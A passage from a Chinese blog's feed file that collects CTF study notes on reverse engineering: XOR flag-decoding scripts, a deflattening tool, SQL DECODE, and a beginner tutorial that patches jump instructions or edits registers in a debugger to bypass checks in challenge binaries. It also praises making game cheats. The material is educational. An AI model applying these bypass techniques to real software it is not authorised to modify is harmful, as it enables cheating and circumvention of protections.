int v3[36]=&#123;0&#125;;<br>  v3[0] = 2;<br>  v3[1] = 5;<br>  v3[2] = 19;<br>  v3[3] = 19;<br>  v3[4] = 2;<br>  v3[5] = 30;<br>  v3[6] = 83;<br>  v3[7] = 31;<br>  v3[8] = 92;<br>  v3[9] = 26;<br>  v3[10] = 39;<br>  v3[11] = 67;<br>  v3[12] = 29;<br>  v3[13] = 54;<br>  v3[14] = 67;<br>  v3[15] = 7;<br>  v3[16] = 38;<br>  v3[17] = 45;<br>  v3[18] = 85;<br>  v3[19] = 13;<br>  v3[20] = 3;<br>  v3[21] = 27;<br>  v3[22] = 28;<br>  v3[23] = 45;<br>  v3[24] = 2;<br>  v3[25] = 28;<br>  v3[26] = 28;<br>  v3[27] = 48;<br>  v3[28] = 56;<br>  v3[29] = 50;<br>  v3[30] = 85;<br>  v3[31] = 2;<br>  v3[32] = 27;<br>  v3[33] = 22;<br>  v3[34] = 84;<br>  v3[35] = 15;<br>  int len=strlen(s);<br>  for(int i=0;i&lt;36;i++)<br>  &#123;<br>    v3[i]^=s[i%12];<br>    printf(&quot;%c&quot;,v3[i]);<br>  &#125;<br>  return 0;<br> &#125;<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-10-23 15:09:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gy0nqhyd565bn9sf">https://www.yuque.com/chaye-apqbl/vsc85q/gy0nqhyd565bn9sf</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%B9%B3%E5%9D%A6%E5%8C%96/"/>
    <url>/2026/01/19/RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%B9%B3%E5%9D%A6%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="平坦化"><a href="#平坦化" class="headerlink" title="平坦化"></a>平坦化</h1><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p><p><font style="color:rgb(68, 68, 68);background-color:rgba(27, 31, 35, 0.05);">python deflat.py -f path&#x2F;to&#x2F;binary –addr hexaddress</font></p><p><font style="color:rgb(68, 68, 68);">关键之处在于寻找程序的 address</font></p><p><img src="/./img/syka403aZmRrNMx4/1757129582382-13302a84-aa41-4ec8-ac67-4447ce17abe0-702093.png" alt="1757129582382-13302a84-aa41-4ec8-ac67-4447ce17abe0.png"></p><p>python deflat.py -f check_passwd_x8664_flat –addr 0x4009A0</p><p>报错</p><p><img src="/./img/syka403aZmRrNMx4/1755676289308-a6288b94-5c22-4657-9c15-fec6da4de24f-587750.png" alt="1755676289308-a6288b94-5c22-4657-9c15-fec6da4de24f.png"></p><blockquote><p>更新: 2025-09-06 11:54:08<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tyendvi5g0c7x7gp">https://www.yuque.com/chaye-apqbl/vsc85q/tyendvi5g0c7x7gp</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/index/"/>
    <url>/2026/01/19/RE/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/index/</url>
    
    <content type="html"><![CDATA[<h1 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h1><blockquote><p>更新: 2024-11-13 14:44:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/gmxzd6x5cicp2tz1">https://www.yuque.com/chaye-apqbl/vsc85q/gmxzd6x5cicp2tz1</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/index/"/>
    <url>/2026/01/19/RE/index/</url>
    
    <content type="html"><![CDATA[<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>1、先查壳，看看是32进制还是64进制写的程序</p><p>2、放IDA里面（F5）反汇编，寻找main函数</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1715255203015-0a7afa50-f9a9-48c7-9b9a-f57ff5918d2e.png"></p><p><img src="/./img/49277317_TGofPdJwCIgPBMdI/1715255231523-cce44c2b-bddd-4209-b42e-b39c100c6c79-324089.png" alt="1715255231523-cce44c2b-bddd-4209-b42e-b39c100c6c79.png"></p><p>找到处理函数sub_401069</p><p><img src="/./img/49277317_TGofPdJwCIgPBMdI/1715255278863-92516cd1-7895-4031-8aaa-863c47817835-151399.png" alt="1715255278863-92516cd1-7895-4031-8aaa-863c47817835.png"></p><p><img src="/./img/49277317_TGofPdJwCIgPBMdI/1715254986489-73a1e12b-9bbe-464c-a88a-a48f053c56dd-715202.png" alt="1715254986489-73a1e12b-9bbe-464c-a88a-a48f053c56dd.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">result= &#x27;DH~mqqvqxB^||zll@Jq~jkwpmvez&#123;&#x27;<br>s=[&#x27;a&#x27;]*32<br><br>for i in range(len(result)):<br>    s[i]=chr(ord(result[i])^ 0x1F)<br>    print(s[i],end=&quot;&quot;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_TGofPdJwCIgPBMdI/1715257489252-70021488-e008-4052-b81f-5e691514019c-696773.png" alt="1715257489252-70021488-e008-4052-b81f-5e691514019c.png"></p><blockquote><p>更新: 2024-05-09 20:56:34<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/lu5cch9z3rb0stuf">https://www.yuque.com/chaye-apqbl/vsc85q/lu5cch9z3rb0stuf</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%BD%E6%95%B0/SQL-decode%E5%87%BD%E6%95%B0/"/>
    <url>/2026/01/19/python/python%E6%95%B0%E6%8D%AE%E5%BA%93%E5%87%BD%E6%95%B0/SQL-decode%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-decode函数"><a href="#SQL-decode函数" class="headerlink" title="SQL-decode函数"></a>SQL-decode函数</h1><p>sql 中 decode(…)函数的用法 —— 相当于 if 语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plain">sql 中 decode(...)函数的用法 —— 相当于 if 语句<br><br>1. decode函数比较1个参数时:<br><br>SELECT <br>ID,<br>DECODE(inParam,&#x27;byComparedParam&#x27;,&#x27;值1&#x27; ,&#x27;值2&#x27;) name<br> FROM test_table;<br><br>#如果第一个参数 inParam == &#x27;byComparedParam&#x27;，<br>#则 select 得到的 name 显示为值1，<br><br>#如果第一个参数 inParam != &#x27;byComparedParam&#x27;，<br>#则 select 得到的 name 显示为值2<br><br>2. decode函数比较多个参数时:<br><br>SELECT <br>ID,<br>DECODE(inParam,&#x27;param1&#x27;,&#x27;值1&#x27; ,&#x27;param2&#x27;,&#x27;值2&#x27;,&#x27;param3&#x27;,&#x27;值3&#x27;,&#x27;param4&#x27;,&#x27;值4&#x27;,&#x27;param5&#x27;,&#x27;值5&#x27;) name <br>FROM test_table;<br><br>#(1)如果第一个参数inParam == &#x27;param1&#x27;<br>#那么那么 select 得到的那么显示为值 1；<br><br>#(2)如果第一个参数inParam == &#x27;param2&#x27;<br>#那么那么 select 得到的那么显示为值 2；<br><br>#(3)如果第一个参数inParam == &#x27;param3&#x27;<br>#那么那么 select 得到的那么显示为值 3；<br><br>#(4)如果第一个参数 inParam == &#x27;param4&#x27;<br>#那么那么 select 得到的那么显示为值 4；<br><br>#(5)如果第一个参数 inParam == &#x27;param5&#x27;<br>#那么那么 select 得到的那么显示为值 5；<br><br>#(6)都不相等就为 &#x27;&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-05-11 10:09:18<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wz9crstodal9gwny">https://www.yuque.com/chaye-apqbl/vsc85q/wz9crstodal9gwny</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/python/pyenv/"/>
    <url>/2026/01/19/python/pyenv/</url>
    
    <content type="html"><![CDATA[<h1 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h1><p><a href="https://blog.csdn.net/Deadeyess/article/details/120668773">【LINUX-KALI 安装 pyenv 教程】_kali pyenv 环境变量-CSDN博客</a></p><p><a href="https://blog.csdn.net/r081r096/article/details/136312141?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522464FE6A9-997C-44FF-90D4-023B0DFB1D06%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=464FE6A9-997C-44FF-90D4-023B0DFB1D06&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-136312141-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=pyenv%E4%BD%BF%E7%94%A8&spm=1018.2226.3001.4187">pyenv用法_pyenv 使用-CSDN博客</a></p><blockquote><p>更新: 2024-09-25 14:20:56<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ru90cpm5814v52i9">https://www.yuque.com/chaye-apqbl/vsc85q/ru90cpm5814v52i9</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/Polis/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8BRE%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8/"/>
    <url>/2026/01/19/Polis/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8BRE%E2%80%94%E2%80%94%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向工程RE——入门"><a href="#逆向工程RE——入门" class="headerlink" title="逆向工程RE——入门"></a>逆向工程RE——入门</h1><h1 id="1-什么是逆向"><a href="#1-什么是逆向" class="headerlink" title="1.什么是逆向"></a>1.什么是逆向</h1><p><strong>逆向工程</strong>（Reverse Engineering，简称 RE）是一门通过分析一个成品系统来了解其设计、结构和实现细节的技术。逆向工程可以应用于硬件、软件、网络协议、文件格式等多个领域，但在计算机安全领域，它主要用于分析软件和恶意软件。</p><p>外挂和改版都是re的成果，不知道大家玩没玩过无敌版的游戏，这就是re大佬先把游戏破解了然后再重做游戏，还有瓦洛兰特的外挂等等，都是re的杰作，当时想打re的一个理想是自己能做一个外挂）</p><h1 id="2-RE简单么"><a href="#2-RE简单么" class="headerlink" title="2.RE简单么"></a>2.RE简单么</h1><p>对于打了半年不到的我来说，re的难度相对于misc和web来说还是有些难度，因为会涉及汇编语言、动态调试的东西，之前大家也听了一些misc和web的课，他们对环境的要求并不是很高，但是re对环境还是有一些要求的，有时候缺少一些dll就可能导致不能动调，（非常烦躁哈哈，这时候就只能去搜索报错的内容，然后去开源网站补对应的文件。</p><h1 id="3、RE适合我么"><a href="#3、RE适合我么" class="headerlink" title="3、RE适合我么"></a>3、RE适合我么</h1><p>我只能引用一句话，为什么人们要攀登珠穆朗玛，因为他就在那里，re真的是挑战带来乐趣，不过我还是建议从misc和web入手开始，不然会在刚开始就怀疑ctf很难导致劝退哈哈，我打re也是因为队里需要re手，所以选择re（没得选，哈哈哈其实也是队内协调过后选择的re，你可能是队内协调选的，也可能是感兴趣选的，我想说的是既然你选择了他，那就坚持下去，一定会有一个好的结果</p><h1 id="4、前期准备"><a href="#4、前期准备" class="headerlink" title="4、前期准备"></a>4、前期准备</h1><h2 id="a-逆向工程的工具"><a href="#a-逆向工程的工具" class="headerlink" title="a.逆向工程的工具"></a>a.逆向工程的工具</h2><p>逆向工程需要借助多种工具，以下是一些常用工具的简介：</p><ul><li><strong>反汇编工具</strong>：<ul><li><strong>Ghidra</strong>：由美国国家安全局（NSA）发布的免费开源逆向工程工具，功能强大，支持多种处理器架构。</li><li><strong>IDA Pro</strong>：一款商业反汇编工具，被广泛应用于逆向工程领域，具有强大的分析和交互功能。</li><li><strong>Binary Ninja</strong>：轻量级的反汇编工具，具有友好的用户界面和较强的分析能力。</li></ul></li><li><strong>调试工具</strong>：<ul><li><strong>GDB</strong>：GNU 调试器，主要用于 Unix-like 系统的程序调试，支持多种编程语言。</li><li><strong>OllyDbg</strong>：Windows 平台下的经典调试工具，界面直观，易于使用。</li><li><strong>x64dbg</strong>：Windows 下的开源调试器，功能类似于 OllyDbg，支持 32 位和 64 位程序的调试。</li></ul></li><li><strong>十六进制编辑器</strong>：<ul><li><strong>winhex</strong>：一款免费的十六进制编辑器，用于查看和修改二进制文件。</li><li>010编辑器</li></ul></li></ul><h2 id="b-汇编语言基础"><a href="#b-汇编语言基础" class="headerlink" title="b. 汇编语言基础"></a>b. 汇编语言基础</h2><p>逆向工程的核心是理解汇编语言，汇编是机器代码的直接表示形式，具有与硬件密切关联的特性。常见的汇编语言包括 x86、x64（用于 Intel&#x2F;AMD 处理器）以及 ARM（用于移动设备）。汇编代码看起来比较原始，但理解汇编语言是逆向工程的必备技能。</p><p><strong>常见汇编指令</strong>：</p><pre><code class="hljs">    * **MOV**：数据传送指令，用于将数据从一个寄存器传送到另一个寄存器或内存地址。    * **ADD/SUB**：算术操作，用于执行加减法。    * **JMP**：跳转指令，用于控制程序执行流的跳转。    * **CALL/RET**：函数调用与返回指令，CALL 调用函数，RET 从函数返回。    * **PUSH/POP**：栈操作指令，用于向栈中压入或从栈中弹出数据。</code></pre><p>理解寄存器（如 EAX、EBX、ESP、EBP）和栈的操作对于逆向工程尤为重要。</p><h1 id="5-怎么做呢"><a href="#5-怎么做呢" class="headerlink" title="5. 怎么做呢"></a>5. 怎么做呢</h1><h2 id="逆向工程通常包括以下几个步骤："><a href="#逆向工程通常包括以下几个步骤：" class="headerlink" title="逆向工程通常包括以下几个步骤："></a>逆向工程通常包括以下几个步骤：</h2><h2 id="收集信息：获取待分析的软件或系统的二进制文件和相关文档。"><a href="#收集信息：获取待分析的软件或系统的二进制文件和相关文档。" class="headerlink" title="收集信息：获取待分析的软件或系统的二进制文件和相关文档。"></a>收集信息：获取待分析的软件或系统的二进制文件和相关文档。</h2><h4 id="他是什么程序呢？"><a href="#他是什么程序呢？" class="headerlink" title="他是什么程序呢？"></a>他是什么程序呢？</h4><p>可能是exe文件，他可能是c语言写的，c++写的，也可能是python写的，可能是64位程序，也可能是32位程序</p><p>还可能是java文件，</p><p>还有可能是安卓文件</p><p>这些都要用到不同的工具，后面我会给大家简单讲解一些相关的题目</p><h2 id="静态分析：在不执行程序的情况下，分析二进制文件的结构和内容，理解代码的逻辑。"><a href="#静态分析：在不执行程序的情况下，分析二进制文件的结构和内容，理解代码的逻辑。" class="headerlink" title="静态分析：在不执行程序的情况下，分析二进制文件的结构和内容，理解代码的逻辑。"></a>静态分析：在不执行程序的情况下，分析二进制文件的结构和内容，理解代码的逻辑。</h2><p>放入ida进行静态的分析</p><h2 id="动态分析：在程序运行时，通过调试工具观察其行为，进一步理解代码的实际功能。"><a href="#动态分析：在程序运行时，通过调试工具观察其行为，进一步理解代码的实际功能。" class="headerlink" title="动态分析：在程序运行时，通过调试工具观察其行为，进一步理解代码的实际功能。"></a>动态分析：在程序运行时，通过调试工具观察其行为，进一步理解代码的实际功能。</h2><h2 id="代码注释和文档化：对分析过程进行详细记录，注释代码，以便日后参考。"><a href="#代码注释和文档化：对分析过程进行详细记录，注释代码，以便日后参考。" class="headerlink" title="代码注释和文档化：对分析过程进行详细记录，注释代码，以便日后参考。"></a>代码注释和文档化：对分析过程进行详细记录，注释代码，以便日后参考。</h2><p>比如设置函数里面的参数，他可能是v12，你可以设置length啥的，更清楚数据表示的意义，可以大大帮助你观察代码的结构和执行过程</p><h2 id="验证和测试：通过修改和测试，验证分析结果和假设。"><a href="#验证和测试：通过修改和测试，验证分析结果和假设。" class="headerlink" title="验证和测试：通过修改和测试，验证分析结果和假设。"></a>验证和测试：通过修改和测试，验证分析结果和假设。</h2><p>你可以执行程序，输入得到的flag，从而验证正确，不过一般flag都比较明显，你能一眼判断出他是否是正确的flag（比如xor后是否有乱码），因为ctf没有罚时这种赛制，所以大胆提交试错就行（不过flag的接连错误可能会影响心态的变化哈哈）</p><h1 id="6-入门学习路径"><a href="#6-入门学习路径" class="headerlink" title="6. 入门学习路径"></a>6. 入门学习路径</h1><p>逆向工程是一门具有挑战性的技能，但可以通过循序渐进的学习路径掌握：</p><ol><li><strong>掌握汇编语言基础</strong>：通过在线教程和资源学习 x86&#x2F;x64 汇编语言，了解基本的指令和寄存器用法。</li><li><strong>学习基本的调试和反汇编工具</strong>：如 Ghidra、IDA Pro、x64dbg，通过实践操作理解程序的基本结构。</li><li><strong>分析简单的 C 语言程序</strong>：编写简单的 C 代码，使用反汇编工具查看其汇编代码，分析函数调用、逻辑流。</li><li><strong>参与逆向工程社区</strong>：在线社区（如 Reddit、CTF 比赛、逆向工程论坛）提供了大量的学习资源和挑战，帮助你提高技能。</li></ol><h1 id="7-题型"><a href="#7-题型" class="headerlink" title="7.题型"></a>7.题型</h1><h2 id="1-普通，一般来说，xor异或的算法考的比较多"><a href="#1-普通，一般来说，xor异或的算法考的比较多" class="headerlink" title="1.普通，一般来说，xor异或的算法考的比较多"></a>1.普通，一般来说，xor异或的算法考的比较多</h2><h3 id="a、upx壳"><a href="#a、upx壳" class="headerlink" title="a、upx壳"></a>a、upx壳</h3><h3 id="b、xor异或"><a href="#b、xor异或" class="headerlink" title="b、xor异或"></a>b、xor异或</h3><h2 id="2-python逆向"><a href="#2-python逆向" class="headerlink" title="2.python逆向"></a>2.python逆向</h2><h2 id="3-java逆向、安卓逆向"><a href="#3-java逆向、安卓逆向" class="headerlink" title="3.java逆向、安卓逆向"></a>3.java逆向、安卓逆向</h2><h2 id="4-asm文件（即汇编语言文件）"><a href="#4-asm文件（即汇编语言文件）" class="headerlink" title="4.asm文件（即汇编语言文件）"></a>4.asm文件（即汇编语言文件）</h2><p><img src="/./img/W5lQPRyCVcMaAkc0/1729667964171-4a7f1618-ed37-47f0-a48a-a480cc47e5fb-905332.png" alt="1729667964171-4a7f1618-ed37-47f0-a48a-a480cc47e5fb.png"></p><h2 id="5-z3逆向"><a href="#5-z3逆向" class="headerlink" title="5.z3逆向"></a>5.z3逆向</h2><h2 id="6-花指令"><a href="#6-花指令" class="headerlink" title="6.花指令"></a>6.花指令</h2><h2 id="7-net逆向"><a href="#7-net逆向" class="headerlink" title="7.net逆向"></a>7.net逆向</h2><h2 id="8-TEA算法（入门最后一关）"><a href="#8-TEA算法（入门最后一关）" class="headerlink" title="8.TEA算法（入门最后一关）"></a>8.TEA算法（入门最后一关）</h2><h1 id="8-例题"><a href="#8-例题" class="headerlink" title="8.例题"></a>8.例题</h1><p>来点题目练练手吧</p><h3 id="动态调试https-www-yuque-com-u34082223-aubum6-vzq2mwcz1o79a5ct-xYPAm"><a href="#动态调试https-www-yuque-com-u34082223-aubum6-vzq2mwcz1o79a5ct-xYPAm" class="headerlink" title="动态调试https://www.yuque.com/u34082223/aubum6/vzq2mwcz1o79a5ct#xYPAm"></a>动态调试<a href="https://www.yuque.com/u34082223/aubum6/vzq2mwcz1o79a5ct#xYPAm">https://www.yuque.com/u34082223/aubum6/vzq2mwcz1o79a5ct#xYPAm</a></h3><p>先看规则</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729670257558-d353bc4d-24c0-4242-9c55-f95aacb76ef2-399521.png" alt="1729670257558-d353bc4d-24c0-4242-9c55-f95aacb76ef2.png"></p><p>老老实实打游戏</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729664823941-8fec6f8d-9215-41aa-9172-48d7f478253d-823155.png" alt="1729664823941-8fec6f8d-9215-41aa-9172-48d7f478253d.png"></p><p>平局也可以赢</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729665721504-e44e3e41-44e5-46cd-aef6-b0860cb3124f-664970.png" alt="1729665721504-e44e3e41-44e5-46cd-aef6-b0860cb3124f.png"></p><p>然后f8步过印刷flag</p><p>不行，我是游戏天才，我要开挂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plain">JE   ;等于则跳转<br>JNE  ;不等于则跳转<br><br>JZ   ;为 0 则跳转<br>JNZ  ;不为 0 则跳转<br><br>JS   ;为负则跳转<br>JNS  ;不为负则跳转<br><br>JC   ;进位则跳转<br>JNC  ;不进位则跳转<br><br>JO   ;溢出则跳转<br>JNO  ;不溢出则跳转<br><br>JA   ;无符号大于则跳转<br>JNA  ;无符号不大于则跳转<br>JAE  ;无符号大于等于则跳转<br>JNAE ;无符号不大于等于则跳转<br><br>JG   ;有符号大于则跳转<br>JNG  ;有符号不大于则跳转<br>JGE  ;有符号大于等于则跳转<br>JNGE ;有符号不大于等于则跳转<br><br>JB   ;无符号小于则跳转<br>JNB  ;无符号不小于则跳转<br>JBE  ;无符号小于等于则跳转<br>JNBE ;无符号不小于等于则跳转<br><br>JL   ;有符号小于则跳转<br>JNL  ;有符号不小于则跳转<br>JLE  ;有符号小于等于则跳转<br>JNLE ;有符号不小于等于则跳转<br><br>JP   ;奇偶位置位则跳转<br>JNP  ;奇偶位清除则跳转<br>JPE  ;奇偶位相等则跳转<br>JPO  ;奇偶位不等则跳转<br><br>INC 自增1   increase<br>DEC 自减1  decrease<br>JGE 前&gt;=后  Jump if  greater or equal<br>JG 前&gt;后   Jump if  greater<br>JLE 前&lt;=后  Jump if  less or equal<br>JL 前&lt;后  Jump if  less<br>JNE 前不等于后  Jump if not equal<br>JE 前等于后  Jump if equal<br></code></pre></td></tr></table></figure><p>要是不想玩游戏可以直接开挂，（虽然但是不太好，但是你学re不就是为了开挂吗</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729666679519-2a841b70-a1e0-4bdb-841b-020e1ed598a2-114722.png" alt="1729666679519-2a841b70-a1e0-4bdb-841b-020e1ed598a2.png"></p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729666592767-4718aa86-bc4a-416a-98d1-d7a786a5482f-399294.png" alt="1729666592767-4718aa86-bc4a-416a-98d1-d7a786a5482f.png"></p><p>修改汇编后下个断点，开始动态调试，记得要去动调里面改汇编</p><p>会赢吗</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729666441484-765ef8fd-2e76-42be-89e7-6f0e12639318-469569.png" alt="1729666441484-765ef8fd-2e76-42be-89e7-6f0e12639318.png"></p><p>逆天改命</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729666484985-3b6ec55c-2f5b-4240-8b56-38c38ab896ae-570904.png" alt="1729666484985-3b6ec55c-2f5b-4240-8b56-38c38ab896ae.png"></p><p>没想到吧，我会开挂</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729666543882-1c320dbd-db0a-4925-89bf-96a05600b4d5-101194.png" alt="1729666543882-1c320dbd-db0a-4925-89bf-96a05600b4d5.png"></p><p>不想玩了，我跟你们爆了</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1729835067589-d2797170-7526-450c-ba5e-06be36cd87f5-344033.png" alt="1729835067589-d2797170-7526-450c-ba5e-06be36cd87f5.png"></p><h1 id="再来一题-getflag"><a href="#再来一题-getflag" class="headerlink" title="再来一题 getflag"></a>再来一题 getflag</h1><h2 id="注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下"><a href="#注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下" class="headerlink" title="注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下"></a><font style="color:#DF2A3F;">注意：如果修改了汇编，patch后那么程序就会更改了，所以调试前最好备份一下</font></h2><p>如果你这么玩的话，那我只能修改你汇编指令了</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721543796759-86019a10-f0bf-44ac-b135-7da5c6661c8e-345449.png" alt="1721543796759-86019a10-f0bf-44ac-b135-7da5c6661c8e.png"></p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721544459743-6b4933db-25bf-421e-9e69-ab9bc417f268-953810.png" alt="1721544459743-6b4933db-25bf-421e-9e69-ab9bc417f268.png"></p><p>点到左边的check函数里面，看到要99999999次的click才能getflag，玩呢</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721544541003-61823652-60d6-4c09-8795-6fb1638a046f-307617.png" alt="1721544541003-61823652-60d6-4c09-8795-6fb1638a046f.png"></p><p>直接动态调试，先在比较cmp地方前面下一个断点<img src="/./img/W5lQPRyCVcMaAkc0/1721556839738-a73b9ac7-7882-47f8-8a17-b02e26cdb767-539871.webp" alt="1721556839738-a73b9ac7-7882-47f8-8a17-b02e26cdb767.png"></p><h2 id="第一种办法，将判断条件修改，jg改成jle"><a href="#第一种办法，将判断条件修改，jg改成jle" class="headerlink" title="第一种办法，将判断条件修改，jg改成jle"></a>第一种办法，将判断条件修改，jg改成jle</h2><p>JG   ;有符号大于则跳转</p><p>JLE  ;有符号小于等于则跳转</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721548794441-06fefed3-aa4f-4d24-835c-d7ebaa3f3cb2-649638.png" alt="1721548794441-06fefed3-aa4f-4d24-835c-d7ebaa3f3cb2.png"></p><p>然后本地调试即可</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721548029980-acd6b0d0-d184-40c2-877b-5bf3a4f44d05-798974.png" alt="1721548029980-acd6b0d0-d184-40c2-877b-5bf3a4f44d05.png"></p><h2 id="第二种，调试时修改寄存器的内容"><a href="#第二种，调试时修改寄存器的内容" class="headerlink" title="第二种，调试时修改寄存器的内容"></a>第二种，调试时修改寄存器的内容</h2><p>CMP</p><p>功能: 比较OP1与OP2的值</p><p>语法: CMP r&#x2F;m,r&#x2F;m&#x2F;data</p><p>标志位: C,P,A,Z,O</p><p>MOV</p><p><strong>功能: 把源操作数送给目的操作数</strong></p><p><strong>语法: MOV 目的操作数,源操作数</strong></p><p><strong>格式: MOV r1,r2</strong></p><p><strong>MOV r,m</strong></p><p><strong>MOV m,r</strong></p><p><strong>MOV r,data</strong></p><hr><p><strong>在比较cmp前面下个断点，然后F7步过进入cmp，修改左上角eax寄存器的值，只要大于0x5E5E0FFh</strong></p><p><strong>点击eax，右键modify，修改数值即可</strong></p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721551040498-86f5836c-2205-4dd9-9aea-d0d996495135-230570.png" alt="1721551040498-86f5836c-2205-4dd9-9aea-d0d996495135.png"></p><p>我这边就修改的比他大1，为5F5E1000，进了一位，然后再F7步过就可以跳到flag分支了</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721551388752-2c3260fd-7c9f-492e-aedb-ccb529ece0c8-245273.png" alt="1721551388752-2c3260fd-7c9f-492e-aedb-ccb529ece0c8.png"></p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721551447323-ee15ef0a-c340-439d-b86e-3ffa4da9ecc8-057417.png" alt="1721551447323-ee15ef0a-c340-439d-b86e-3ffa4da9ecc8.png"></p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721551458819-a02738d9-f2ac-428f-a4e1-1bb07bdef89d-419774.png" alt="1721551458819-a02738d9-f2ac-428f-a4e1-1bb07bdef89d.png"></p><p>成功跳转后，F9运行程序即可</p><p><img src="/./img/W5lQPRyCVcMaAkc0/1721551205280-0d468676-ce93-4c86-ad1d-4994326f8e16-019309.png" 